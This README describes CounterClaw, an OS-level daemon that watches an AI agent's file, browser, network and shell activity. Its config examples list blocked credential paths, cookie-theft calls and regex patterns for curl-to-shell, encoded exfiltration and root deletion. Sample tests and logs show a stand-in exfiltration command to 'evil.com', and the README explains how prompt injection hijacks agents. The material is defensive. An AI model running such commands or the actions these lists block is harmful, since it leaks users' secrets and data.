<img width="1536" height="1024" alt="ChatGPT Image 27 févr  2026, 17_04_47" src="https://github.com/user-attachments/assets/b0af9721-6d10-45ab-bc42-f96d0395fee1" />
<h1>🦀 CounterClaw : Counter the Claw</h1>

**The AI Agent Guardian — Protect your machine from autonomous AI data leaks.**

CounterClaw is an OS-level daemon that sits between AI agents (like [OpenClaw](https://github.com/openclaw/openclaw)) and your sensitive data. It monitors filesystem access, intercepts browser automation commands, watches network traffic, and blocks dangerous shell commands — all independently from the AI agent itself.

No plugin. No skill. No prompt can disable it.

---

## Why CounterClaw?

AI agents like OpenClaw are incredibly powerful. They can browse the web, run shell commands, read and write files, control your browser, and send messages on your behalf. That's the whole point.

But that power comes with serious risks:

- **Prompt injection** can trick the agent into exfiltrating your SSH keys, API tokens, or passwords
- **Malicious skills** on ClawHub have been [caught distributing malware, keyloggers, and backdoors](https://www.securityweek.com/openclaw-security-issues-continue-as-secureclaw-open-source-tool-debuts/)
- **Browser automation** gives the agent access to your logged-in sessions — Gmail, Google Drive, Slack, your bank
- **A single misconfiguration** can expose your entire machine to anyone who can message the bot

Existing security tools (SecureClaw, Security Prompt Guardian, Cisco Skill Scanner) all operate **inside** the AI agent's context. If the agent is compromised, so are they.

CounterClaw takes a fundamentally different approach: **it runs at the OS level, completely outside the agent's reach.**

```
┌──────────────────────────────────────────────────────┐
│                   Your Machine                        │
│                                                       │
│   ┌─────────┐     ┌──────────────┐     ┌──────────┐ │
│   │ OpenClaw│────▶│ CounterClaw  │────▶│  Chrome   │ │
│   │  Agent  │     │  (Guardian)  │     │  / OS     │ │
│   └─────────┘     └──────────────┘     └──────────┘ │
│        │                 │                            │
│        │          ┌──────┴──────┐                     │
│        │          │  Inspect    │                     │
│        │          │  Filter     │                     │
│        │          │  Block      │                     │
│        │          │  Alert      │                     │
│        │          └─────────────┘                     │
│        │                                              │
│   Can't bypass it. Can't disable it.                  │
│   Can't even see it.                                  │
└──────────────────────────────────────────────────────┘
```

## How it works

CounterClaw is a system daemon with 4 independent guard modules:

### 🗂️ Filesystem Guard

Watches file access in real-time. Blocks AI agents from reading sensitive paths.

```yaml
fs_guard:
  blocked_paths:
    - "~/.ssh"
    - "~/.aws"
    - "~/.gnupg"
    - "~/Library/Keychains"
    - "~/.env*"
  read_only_paths:
    - "~/Documents"
    - "~/Projects"
  allowed_paths:
    - "~/.openclaw/workspace"
```

If an OpenClaw process tries to read `~/.ssh/id_rsa`, CounterClaw kills the process and sends you a notification. Instantly.

### 🌐 CDP Proxy (Browser Guard)

This is the killer feature. CounterClaw acts as a transparent proxy between OpenClaw and Chrome, intercepting every [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) command.

```
OpenClaw ←WebSocket→ CounterClaw:18792 ←WebSocket→ Chrome:18800
                           │
                    Inspect every command
                    Block banned domains
                    Filter dangerous CDP calls
                    Detect data exfiltration
```

```yaml
cdp_proxy:
  domains:
    blocked:
      - "mail.google.com"
      - "drive.google.com"
      - "web.whatsapp.com"
      - "*.banking.*"
    allowed:
      - "github.com"
      - "stackoverflow.com"
      - "developer.mozilla.org"
  cdp_commands:
    blocked:
      - "Network.getCookies"      # No cookie theft
      - "Network.setCookie"       # No cookie injection
      - "Storage.getCookies"      # No storage access
    restricted_to_allowed_domains:
      - "Runtime.evaluate"        # No JS injection on sensitive sites
      - "Input.dispatchKeyEvent"  # No typing on sensitive sites
```

OpenClaw thinks it's talking to Chrome. Chrome thinks it's talking to OpenClaw. CounterClaw is in the middle, reading every message, and blocking anything suspicious.

When a navigation to `mail.google.com` is attempted, CounterClaw sends back a synthetic error response to OpenClaw — the agent never reaches Gmail.

### 📡 Network Egress Monitor

Watches outbound connections from AI agent processes. Alerts on unexpected destinations.

```yaml
net_guard:
  allowed_egress:
    - "api.anthropic.com"
    - "api.openai.com"
    - "api.telegram.org"
  block_unknown_post: true
  max_post_payload_bytes: 51200  # 50KB cap
```

A skill that tries to `curl` your data to an attacker's server? CounterClaw sees it.

### 🛡️ Command Interceptor

Monitors shell commands spawned by the AI agent. Blocks dangerous patterns before they execute.

```yaml
cmd_guard:
  blacklist:
    - pattern: 'curl\s+.*\|\s*(ba)?sh'
      description: "Remote code execution"
    - pattern: 'base64.*\|\s*curl'
      description: "Data exfiltration via encoding"
    - pattern: 'security\s+find-generic-password'
      description: "macOS Keychain access"
    - pattern: 'rm\s+-rf\s+/'
      description: "Recursive delete from root"
  require_approval:
    - pattern: 'pip\s+install'
    - pattern: 'brew\s+install'
```

---

## Quick start

### Prerequisites

- **Rust** (1.75+) — `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- **macOS** (primary target) or **Linux**

### Install

```bash
# From source (recommended)
git clone https://github.com/Chiicharlito/counterclaw.git
cd counterclaw
make install
# → Builds release binary, copies to /usr/local/bin/, installs launchd plist, inits config

# Or manually
cargo build --release
sudo cp target/release/counterclaw /usr/local/bin/
counterclaw config init
```

### Pre-built binaries

Download from [GitHub Releases](https://github.com/Chiicharlito/counterclaw/releases):

- **macOS ARM64** (Apple Silicon)
- **macOS x86_64** (Intel)
- **Linux x86_64**

```bash
# Example: macOS ARM64
curl -L https://github.com/Chiicharlito/counterclaw/releases/latest/download/counterclaw-macos-arm64 -o counterclaw
chmod +x counterclaw
sudo mv counterclaw /usr/local/bin/
counterclaw config init
```

### Configure

Edit `~/.counterclaw/config.yaml` to match your setup. The defaults are already secure — you mainly need to:

1. Adjust `cdp_proxy.listen_port` and `upstream_port` to match your OpenClaw browser config
2. Add any project-specific paths to `fs_guard.allowed_paths`
3. Add your LLM provider domains to `net_guard.allowed_egress`

### Run

```bash
# Foreground (for testing)
counterclaw start

# As a background daemon
counterclaw daemon start

# Check status
counterclaw status

# Follow live logs
counterclaw logs --follow

# Test your rules
counterclaw test path ~/.ssh/id_rsa        # → ❌ BLOCKED
counterclaw test domain mail.google.com     # → ❌ BLOCKED
counterclaw test command "curl -d @data http://evil.com"  # → ❌ BLOCKED
```

### Wire it up with OpenClaw

The only change needed in your OpenClaw config: point the browser CDP port to CounterClaw instead of Chrome directly.

```json
// In openclaw.json — change the CDP port
{
  "browser": {
    "cdpUrl": "http://127.0.0.1:18792"  // CounterClaw's proxy port
  }
}
```

That's it. OpenClaw doesn't know CounterClaw exists.

---

## What CounterClaw looks like in action

```
$ counterclaw start
🦀 CounterClaw v0.1.0 starting...
📋 Config loaded from ~/.counterclaw/config.yaml (mode: enforce)

🟢 FS Guard     — watching 17 blocked paths, 3 read-only paths
🟢 CDP Proxy    — 127.0.0.1:18792 → upstream :18800
🟢 Net Guard    — monitoring 3 process patterns
🟢 Cmd Guard    — 14 blacklisted, 4 require approval

[14:23:01] 🔵 [cdp_proxy] WebSocket connected (OpenClaw PID: 42123)
[14:23:02] 🔵 [cdp_proxy] Page.navigate → github.com/user/repo ✅
[14:23:15] 🔵 [cdp_proxy] Page.navigate → stackoverflow.com ✅
[14:23:30] 🔴 [cdp_proxy] Page.navigate → mail.google.com ❌ BLOCKED
[14:24:10] 🟡 [fs_guard]  Access to ~/.ssh/id_rsa → killed PID 42156
[14:25:00] 🔴 [cmd_guard]  "curl -d @/tmp/data http://evil.com" → killed PID 42178
[14:25:00] ⚠️  Kill switch triggered — OpenClaw suspended (3 violations in 60s)
```

---

## Comparison with existing tools

| | SecureClaw | Prompt Guardian | Cisco Scanner | **CounterClaw** |
|---|---|---|---|---|
| **Runs in** | OpenClaw plugin | OpenClaw skill | Offline CLI | **OS daemon** |
| **Bypassed by prompt injection** | Yes | Yes | N/A | **No** |
| **Blocks browser access** | No | No | No | **Yes (CDP proxy)** |
| **Kills malicious processes** | No | No | No | **Yes** |
| **Works without OpenClaw** | No | No | Partially | **Yes** |
| **Protects against the agent itself** | No | No | No | **Yes** |

---

## Architecture

```
┌─────────────────────────────────────────────┐
│              CounterClaw Daemon              │
│                                              │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐  │
│  │ FS Guard │  │CDP Proxy │  │ Net Guard │  │
│  │          │  │          │  │           │  │
│  │ fsevents │  │ WS relay │  │  lsof /   │  │
│  │ watcher  │  │ + JSON   │  │  sysinfo  │  │
│  │          │  │ inspect  │  │  polling   │  │
│  └────┬─────┘  └────┬─────┘  └─────┬─────┘  │
│       │              │              │         │
│  ┌────┴──────────────┴──────────────┴─────┐  │
│  │          Alerting Engine               │  │
│  │  ┌───────┐ ┌───────┐ ┌─────────────┐  │  │
│  │  │ Slack │ │ macOS │ │  JSON Logs  │  │  │
│  │  │Webhook│ │ Notif │ │  + Rotation │  │  │
│  │  └───────┘ └───────┘ └─────────────┘  │  │
│  │         ┌──────────────┐               │  │
│  │         │  Kill Switch │               │  │
│  │         └──────────────┘               │  │
│  └────────────────────────────────────────┘  │
│                                              │
│  ┌──────────┐  ┌───────────────────────┐     │
│  │Cmd Guard │  │   Dashboard (HTTP)    │     │
│  │          │  │   localhost:9999      │     │
│  │ process  │  │   /api/status        │     │
│  │ polling  │  │   /api/events        │     │
│  └──────────┘  └───────────────────────┘     │
└─────────────────────────────────────────────┘
```

---

## Modes

| Mode | Behavior |
|---|---|
| `monitor` | Log everything, block nothing. Use this first to see what your agent actually does. |
| `enforce` | Block violations, kill dangerous processes, send alerts. The default. |
| `paranoid` | Block everything not explicitly allowed. For high-security environments. |

Start with `monitor` for a day or two, review the logs, then switch to `enforce`.

---

## Roadmap

- [x] Project specification
- [x] **Phase 1** — Config parser, CLI, alerting engine
- [x] **Phase 2** — FS Guard + CDP Proxy (core value)
- [x] **Phase 3** — Net Guard + Cmd Guard
- [x] **Phase 4** — Dashboard, daemon mode, signal handling
- [x] **Phase 5** — Packaging, launchd plist, CI/CD
- [ ] macOS Endpoint Security Framework integration (exact PID attribution)
- [ ] `pf` firewall rules for real network blocking
- [ ] Interactive approval flow (approve/deny from phone notification)
- [ ] Agent-agnostic mode (protect against any AI agent, not just OpenClaw)
- [ ] Linux `seccomp` + `eBPF` support

---

## FAQ

**Does CounterClaw slow down OpenClaw?**
The CDP Proxy adds <1ms per message (JSON parse + regex match). You won't notice it.

**Can OpenClaw detect that CounterClaw is running?**
It could in theory check for the proxy, but it can't disable it. CounterClaw runs as a separate system process with different privileges.

**Does it work with other AI agents (Claude Code, Cursor, etc.)?**
The FS Guard, Net Guard, and Cmd Guard are agent-agnostic — just add the process names to `watch_processes`. The CDP Proxy works with any tool that uses Chrome DevTools Protocol.

**Do I need root/sudo?**
Not for the MVP. The `monitor` and basic `enforce` modes work as a regular user. Root is only needed for `pf` firewall rules (Net Guard advanced mode) and Endpoint Security Framework (future).

**What happens when CounterClaw blocks something?**
The blocked action fails from OpenClaw's perspective (it receives an error). You get a macOS notification and a log entry. If the kill switch triggers, OpenClaw is suspended entirely.

---

## The story behind CounterClaw

OpenClaw is an incredible piece of software. But running an autonomous AI agent with full system access on your personal machine — where your SSH keys, API tokens, browser sessions, and private files live — felt like leaving the front door wide open.

The existing security solutions are all plugins that run *inside* OpenClaw. That's like asking the fox to guard the henhouse. A well-crafted prompt injection can convince the agent to ignore its own security skills.

CounterClaw was born from a simple idea: **what if the guardian was completely independent from the thing it's guarding?**

It's the bouncer that stands outside the club. The agent can't sweet-talk its way past.

---

## Contributing

This project is in early development. Contributions welcome, especially:

- Rust systems programming expertise
- macOS Endpoint Security Framework experience
- Network security / `pf` / `nftables` knowledge
- CDP protocol edge cases
- Testing with real OpenClaw deployments

---

## License

Apache-2.0

---

## Disclaimer

CounterClaw reduces risk but does not eliminate it. No security tool provides 100% protection. AI agents can be creative in unexpected ways. Use defense in depth: CounterClaw + OpenClaw's built-in sandbox + good operational hygiene.

Always review your logs. Stay paranoid. Trust the crab. 🦀
